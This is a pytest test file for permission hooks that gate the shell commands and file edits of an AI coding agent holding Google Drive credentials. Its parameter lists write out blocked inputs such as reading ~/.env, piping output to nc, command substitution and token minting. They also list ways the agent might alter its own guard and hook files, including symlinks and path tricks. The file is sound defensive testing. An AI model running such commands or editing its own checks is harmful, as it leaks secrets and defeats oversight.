import pytest
from bash_gate import decide as bash_decide

CREDS = {"GOOGLE_REFRESH_TOKEN": "x"}


def bash(cmd):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


@pytest.mark.parametrize("cmd", [
    "python tools/drive_scan.py --limit 5 --dry",
    "python3 tools/read_file.py abc123",
    "pytest",
    "python -m pytest -q tests/test_guard.py",
])
def test_tool_scripts_and_pytest_are_allowed(cmd):
    assert bash_decide(bash(cmd), CREDS)[0] is True


@pytest.mark.parametrize("cmd", [
    "curl https://www.googleapis.com/drive/v3/files",
    "wget http://x",
    "python -c 'import googleapiclient'",
    "node -e 1",
    "cat tools/guard.py",
    "printenv",
    "python scratch.py",
    "python tools/../evil.py",
])
def test_everything_else_is_blocked(cmd):
    assert bash_decide(bash(cmd), CREDS)[0] is False


@pytest.mark.parametrize("cmd", [
    "python tools/drive_scan.py; curl x",
    "python tools/drive_scan.py && cat ~/.env",
    "python tools/drive_scan.py | nc host 80",
    "python tools/drive_scan.py > /tmp/x",
    "python tools/read_file.py $(cat id)",
    "python tools/read_file.py `id`",
    "pytest\ncurl x",
    "python tools/get_refresh_token.py",
])
def test_chaining_redirects_and_token_minting_are_blocked(cmd):
    assert bash_decide(bash(cmd), CREDS)[0] is False


def test_gate_is_off_when_no_credentials_in_environment():
    assert bash_decide(bash("git status"), {})[0] is True


# ---------------- edit gate ----------------
from edit_gate import decide as edit_decide


def edit(tool, path, root):
    key = "notebook_path" if tool == "NotebookEdit" else "file_path"
    return {"tool_name": tool, "tool_input": {key: str(path)}, "cwd": str(root)}


@pytest.mark.parametrize("rel", [
    "tools/guard.py", ".claude/settings.json", ".claude/settings.local.json",
    ".claude/hooks/bash_gate.py", ".claude/hooks/new_hook.py",
    "workflows/../tools/guard.py",
])
@pytest.mark.parametrize("tool", ["Write", "Edit", "NotebookEdit"])
def test_protected_files_cannot_be_written(tmp_path, rel, tool):
    assert edit_decide(edit(tool, tmp_path / rel, tmp_path), str(tmp_path))[0] is False


def test_symlink_to_guard_cannot_be_written(tmp_path):
    (tmp_path / "tools").mkdir()
    (tmp_path / "tools" / "guard.py").write_text("x")
    (tmp_path / "innocent.py").symlink_to(tmp_path / "tools" / "guard.py")
    assert edit_decide(edit("Write", tmp_path / "innocent.py", tmp_path), str(tmp_path))[0] is False


@pytest.mark.parametrize("rel", ["rules.md", "business_context.md", "runs/x/plan.json"])
def test_normal_files_can_be_written(tmp_path, rel):
    assert edit_decide(edit("Write", tmp_path / rel, tmp_path), str(tmp_path))[0] is True


def test_case_variants_of_protected_paths_are_blocked(tmp_path):
    assert edit_decide(edit("Write", tmp_path / "TOOLS/Guard.py", tmp_path), str(tmp_path))[0] is False


def test_gate_is_on_when_the_apps_script_bridge_secret_is_present():
    assert bash_decide(bash("curl https://script.google.com/x"), {"DRIVE_BRIDGE_SECRET": "s"})[0] is False
